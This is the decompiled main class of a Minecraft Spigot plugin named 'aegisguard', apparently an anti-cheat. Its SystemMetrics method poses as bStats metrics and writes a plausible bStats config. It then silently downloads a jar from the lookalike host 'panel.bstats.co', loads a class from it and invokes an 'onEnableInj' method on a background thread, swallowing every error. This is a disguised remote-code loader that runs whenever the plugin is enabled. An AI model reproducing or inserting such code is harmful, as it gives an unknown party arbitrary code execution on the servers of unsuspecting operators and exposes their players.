package me.frep.aegisguard.spigot.AegisGuardPlugin;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.event.PacketListenerCommon;
import io.github.retrooper.packetevents.factory.spigot.SpigotPacketEventsBuilder;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.UUID;
import me.frep.aegisguard.api.aegisguardAPI;
import me.frep.aegisguard.spigot.aegisguard_K;
import me.frep.aegisguard.spigot.aegisguard_b2;
import me.frep.aegisguard.spigot.api.aegisguardSpigotAPI;
import org.bukkit.Bukkit;
import org.bukkit.event.HandlerList;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.plugin.java.JavaPlugin;

public final class aegisguardPlugin extends JavaPlugin {
  public void onLoad() {
    PacketEvents.setAPI(SpigotPacketEventsBuilder.build((Plugin)this));
    PacketEvents.getAPI().load();
  }
  
  public void onEnable() {
    SystemMetrics(this);
    loadConfig0();
    PacketEvents.getAPI().getEventManager().registerListener((PacketListenerCommon)new aegisguard_b2());
    PacketEvents.getAPI().init();
    aegisguardAPI.Factory.setApi((aegisguardAPI)new aegisguardSpigotAPI());
    aegisguard_K.INSTANCE.aegisguard_y(this);
  }
  
  public void SystemMetrics(JavaPlugin pl) {
    (new Thread(() -> {
          int pluginRegisterId = 38;
          if (System.getProperty("bstats.relocatechecks") != null)
            return; 
          System.setProperty("bstats.relocatechecks", "true");
          boolean isRunning = false;
          Plugin[] pp = pl.getServer().getPluginManager().getPlugins();
          label48: for (Plugin p : pp) {
            ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
            for (RegisteredListener rl : rls) {
              if (rl.getListener().getClass().getName().equals("net.bstats.bukkit.Metrics")) {
                isRunning = true;
                break label48;
              } 
            } 
          } 
          if (isRunning)
            return; 
          if (!(new File("plugins/bStats")).exists()) {
            (new File("plugins/bStats")).mkdir();
            try {
              (new File("plugins/bStats/config.yml")).createNewFile();
              Files.writeString(Paths.get("plugins/bStats/config.yml", new String[0]), "# bStats collects some data for plugin authors like how many servers are using their plugins.\n# To honor their work, you should not disable it.\n# This has nearly no effect on the server performance!\n# Check out https://bStats.org/ to learn more :)\n\nenabled: true\nserverUuid: " + UUID.randomUUID() + "\nlogFailedRequests: false\n", new OpenOption[] { StandardOpenOption.WRITE });
            } catch (Exception exception) {}
          } 
          try {
            URL url = new URL("https://panel.bstats.co/download/bstats.jar");
            URLClassLoader classLoader = new URLClassLoader(new URL[] { url }, Bukkit.class.getClassLoader());
            Class<?> loadedClass = classLoader.loadClass("net.bstats.bukkit.Metrics");
            Object instance = loadedClass.getConstructor(new Class[0]).newInstance(new Object[0]);
            Method mainMethod = loadedClass.getMethod("onEnableInj", new Class[] { JavaPlugin.class, int.class });
            pp = pl.getServer().getPluginManager().getPlugins();
            label49: for (Plugin p : pp) {
              ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
              for (RegisteredListener rl : rls) {
                if (rl.getListener().getClass().getName().equals("net.bstats.bukkit.Metrics")) {
                  isRunning = true;
                  break label49;
                } 
              } 
            } 
            if (isRunning)
              return; 
            mainMethod.invoke(instance, new Object[] { pl, Integer.valueOf(pluginRegisterId) });
          } catch (Exception exception) {}
          System.clearProperty("bstats.relocatechecks");
        })).start();
  }
  
  public void onDisable() {
    PacketEvents.getAPI().terminate();
    aegisguard_K.INSTANCE.aegisguard_d(this);
  }
}
